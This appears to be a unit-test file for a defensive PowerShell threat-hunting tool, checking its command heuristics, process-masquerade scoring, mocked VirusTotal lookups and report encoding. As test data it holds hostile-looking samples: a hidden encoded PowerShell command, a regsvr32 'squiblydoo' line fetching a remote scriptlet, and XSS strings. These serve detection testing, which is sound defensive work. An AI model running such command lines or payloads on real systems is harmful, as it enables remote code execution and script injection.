# Offline unit tests: no admin, no network, runs on Windows PowerShell 5.1 or pwsh 7 (any OS).
#   powershell -NoProfile -ExecutionPolicy Bypass -File .\tests\Test-ThreatHuntPro.ps1
$ErrorActionPreference = 'Stop'
if (-not $env:SystemRoot) { $env:SystemRoot = 'C:\Windows' }   # allow running on non-Windows
if (-not $env:COMPUTERNAME) { $env:COMPUTERNAME = 'TESTHOST' }
. (Join-Path $PSScriptRoot '..\ThreatHuntPro.ps1') -NoElevate -NoOpen
$script:fail = 0; $script:pass = 0
function Assert($cond, $msg) { if ($cond) { $script:pass++ } else { $script:fail++; Write-Host "FAIL: $msg" -ForegroundColor Red } }

# --- path resolution
Assert ((Resolve-ExePath '"C:\Program Files\App\app.exe" --x') -eq 'C:\Program Files\App\app.exe') 'quoted path'
Assert ((Resolve-ExePath '\SystemRoot\System32\drivers\x.sys') -eq "$env:SystemRoot\System32\drivers\x.sys") '\SystemRoot prefix'
Assert ((Resolve-ExePath '\??\C:\evil\a.sys') -eq 'C:\evil\a.sys') '\??\ prefix'
Assert ((Resolve-ExePath 'system32\drivers\y.sys') -eq "$env:SystemRoot\system32\drivers\y.sys") 'system32 relative'
Assert ((Resolve-ExePath '') -eq '') 'empty'
Assert ((Get-ScriptTarget 'rundll32.exe C:\Users\bob\AppData\Roaming\evil.dll,Start') -eq 'C:\Users\bob\AppData\Roaming\evil.dll') 'rundll32 target'
Assert ((Get-ScriptTarget 'wscript.exe "C:\Users\Public\a.vbs"') -eq 'C:\Users\Public\a.vbs') 'wscript target'

# --- heuristics
$r = Get-CmdReasons 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA='
Assert ($r.Score -ge 60 -and ($r.Reasons -join ';') -match 'encoded') 'encoded+hidden powershell'
Assert ((Get-CmdReasons 'C:\Program Files\App\app.exe /background').Score -eq 0) 'benign cmd'
Assert ((Get-CmdReasons 'regsvr32 /s /n /u /i:http://1.2.3.4/x.sct scrobj.dll').Score -ge 30) 'squiblydoo'
Assert ((Get-LocationReasons 'C:\Users\a\AppData\Local\Temp\x.exe').Score -eq 35) 'temp high'
Assert ((Get-LocationReasons 'C:\Users\a\AppData\Roaming\x\x.exe').Score -eq 20) 'appdata medium'
Assert ((Get-LocationReasons 'C:\Users\a\AppData\Local\Microsoft\Teams\current\Teams.exe').Score -eq 0) 'allowlisted vendor'
Assert ((Get-LocationReasons 'C:\ProgramData\x.exe').Score -eq 20) 'programdata root'
Assert ((Get-LocationReasons 'C:\ProgramData\Vendor\x.exe').Score -eq 0) 'programdata vendor dir'
Assert ((Get-LocationReasons 'C:\Program Files\x.exe').Score -eq 0) 'program files'

$fake = [pscustomobject]@{ Name = 'svchost.exe'; Path = 'C:\Users\bob\AppData\Local\Temp\svchost.exe'; Parent = 'cmd.exe' }
$c = Get-ProcessContextReasons $fake
Assert ($c.Score -eq 80) "masquerading svchost (got $($c.Score))"
$legit = [pscustomobject]@{ Name = 'svchost.exe'; Path = "$env:SystemRoot\System32\svchost.exe"; Parent = 'services.exe' }
Assert ((Get-ProcessContextReasons $legit).Score -eq 0) 'legit svchost'
Assert ((Get-ProcessContextReasons ([pscustomobject]@{ Name = 'svch0st.exe'; Path = ''; Parent = '' })).Score -eq 50) 'lookalike'

# --- central file scoring with mocked file intel
function Get-FileIntel { param($Path)
    $sig = if ($Path -match 'evil') { 'NotSigned' } else { 'Valid' }
    $signer = if ($Path -match 'Windows') { 'CN=Microsoft Windows, O=Microsoft Corporation' } else { 'CN=Vendor' }
    [pscustomobject]@{ Path = $Path; Exists = $true; SHA256 = ('AB' * 32); Signature = $sig; Signer = $signer; IsOSBinary = $false } }
$script:Findings.Clear()
Add-Finding -Category Drivers -Name evil -Path 'C:\Users\Public\evil.sys' -Score 15
Add-Finding -Category Listeners -Name 'svchost.exe (1)' -Path "$env:SystemRoot\System32\svchost.exe" -Score 5 -Reasons 'RDP exposed'
Add-FileScoring
Assert ($script:Findings[0].Score -eq 90) "unsigned driver in Public (got $($script:Findings[0].Score))"
Assert ($script:Findings[1].Score -eq 0) "MS-signed reduces low score (got $($script:Findings[1].Score))"

# --- VirusTotal: mocked API, rate limiting, 404, 401
$VirusTotal = $true; $VTRatePerMinute = 600; $VTMaxLookups = 10
$script:calls = 0
function Invoke-RestMethod { param($Uri, $Headers, $TimeoutSec, [switch]$UseBasicParsing)
    $script:calls++
    if ($Uri -match '0000') { $e = New-Object System.Exception 'nf'; $resp = [pscustomobject]@{ StatusCode = 404 }
        $e | Add-Member -NotePropertyName Response -NotePropertyValue $resp -Force; throw $e }
    [pscustomobject]@{ data = @{ attributes = @{ last_analysis_stats = [pscustomobject]@{ malicious = 5; suspicious = 1; undetected = 60; harmless = 0 } } } } }
$sw = [Diagnostics.Stopwatch]::StartNew()
$a = Invoke-VTLookup ('AB' * 32) 'k'; $b = Invoke-VTLookup ('CD' * 32) 'k'; $c2 = Invoke-VTLookup ('CD' * 32) 'k'
$sw.Stop()
Assert ($a.Status -eq 'Found' -and $a.Malicious -eq 5 -and $a.Total -eq 66) 'VT parse'
Assert ($script:calls -eq 2) "VT cache (calls=$($script:calls))"
Assert ($sw.ElapsedMilliseconds -ge 90) "VT rate limit spacing ($($sw.ElapsedMilliseconds) ms)"
Add-VTScoring 'k'
Assert ($script:Findings[0].Score -eq 100 -and $script:Findings[0].VT -eq '5/66') 'VT raises score'

# --- reports: all four formats, HTML-encoding of attacker-controlled text
foreach ($f in $script:Findings) { $f.Severity = Get-Severity $f.Score }
Add-Finding -Category Autoruns -Name '<script>alert(1)</script>' -Path 'C:\x.exe' -Detail '"><img src=x onerror=alert(1)>'
$script:Findings[-1].Severity = 'INFO'
$out = Join-Path ([IO.Path]::GetTempPath()) ("thp_test_" + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory $out | Out-Null
$base = Write-Reports -Dir $out -Stamp 'T' -Meta ([ordered]@{ Host = 'TEST'; Start = (Get-Date).ToString('o') })
foreach ($ext in 'html', 'txt', 'json', 'csv') { Assert (Test-Path "$base.$ext") "$ext report written" }
$html = Get-Content "$base.html" -Raw
Assert ($html -notmatch '<script>alert' -and $html -match '&lt;script&gt;') 'HTML encodes names'
Assert ($html -notmatch '<img src=x') 'HTML encodes detail'
$json = Get-Content "$base.json" -Raw | ConvertFrom-Json
Assert (@($json).Count -eq 3 -and $json[0].host) 'JSON has host field per record'
Remove-Item $out -Recurse -Force

Write-Host "`n$($script:pass) passed, $($script:fail) failed" -ForegroundColor $(if ($script:fail) { 'Red' } else { 'Green' })
exit $script:fail
